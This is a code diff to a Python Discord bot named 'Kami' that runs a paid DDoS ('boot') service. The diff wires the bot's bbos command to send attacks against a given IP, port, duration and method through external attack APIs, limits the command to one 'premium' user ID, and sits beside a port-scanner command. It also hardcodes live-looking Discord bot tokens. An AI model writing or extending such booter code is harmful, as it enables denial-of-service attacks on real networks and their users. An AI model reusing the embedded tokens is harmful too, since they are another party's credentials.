@@ -81,6 +81,7 @@ class MyClient(discord.Client):
             await DiscordUtilities.embed(message, setEmbedInfo("Kami | Port Scanner", f"Display open ports to a network", ports), True)
         
         elif msg.startswith(f"{prefix}bbos"):
+            if message.author.id != 1061877346153541732: return await DiscordUtilities.embed(message, setEmbedInfo("Kami | Bbos Error", "[ X ] Error, You do not have premium to use this commands!", {}), False)
             if len(msg_args) != 5:
                 return await DiscordUtilities.embed(message, setEmbedInfo("Kami | Bbos Error", f"[ X ] Error, Invalid arguments provided\r\nUsage: {prefix}bbos <ip_address> <port> <time> <method>", {}), False)
 
@@ -96,13 +97,14 @@ class MyClient(discord.Client):
             if int(msg_args[3]) > kami_account.max_time | msg_args[3].isdigit() == False: 
                 return await DiscordUtilities.embed(message, setEmbedInfo("Kami | Bbos Error", f"[ X ] Error, You've went over your maximum boot time. Use a lower boot time!", {}), False)
 
-            a = API(msg_args[3])
-
-            if not a.apis_found:
+            a = API(msg_args[4])
+            if not a.check_for_apis():
                 return await DiscordUtilities.embed(message, setEmbedInfo("Kami | Bbos Error", f"[ X ] Error, We do not have an API with this method!", {}), False)
             
-            return await DiscordUtilities.embed(message, setEmbedInfo("Kami | Attack Status", f"Attack {msg_args[1]}:{msg_args[2]} for {msg_args[3]} seconds with {msg_args[4]} sent to {a.count_apis_found()} APIs..."))
-            ## check cooldown than bbos function
+            api_count = a.count_apis_found()
+            a.request_attack(msg_args[1], int(msg_args[2]), int(msg_args[3]), msg_args[4])
+
+            return await DiscordUtilities.embed(message, setEmbedInfo("Kami | Attack Status", f"Attack {msg_args[1]}:{msg_args[2]} for {msg_args[3]} seconds with {msg_args[4]} sent to {api_count} APIs...", a.get_responses()), False)
 
         print(f"\x1b[31m[{time.month}/{time.day}/{time.year} % {time.hour}:{time.minute}]\x1b[0m{message.author}: \x1b[33m{msg}\x1b[0m")
 
@@ -110,4 +112,4 @@ class MyClient(discord.Client):
 intents = discord.Intents.default()
 intents.message_content = True
 client = MyClient(intents=intents)
-client.run('MTA2NTE2NzA3MDUyMzgyNjE5OA.GqcAyS.YePpiw3GI-7_d1Q8ujgNcLDogAonsq3V57pN3c')
+client.run('MTA2NTE2NzA3MDUyMzgyNjE5OA.GtsBPl.gAjW-N95rdprYrhb2yKWAEHdBg-iekRXXR2R3g')
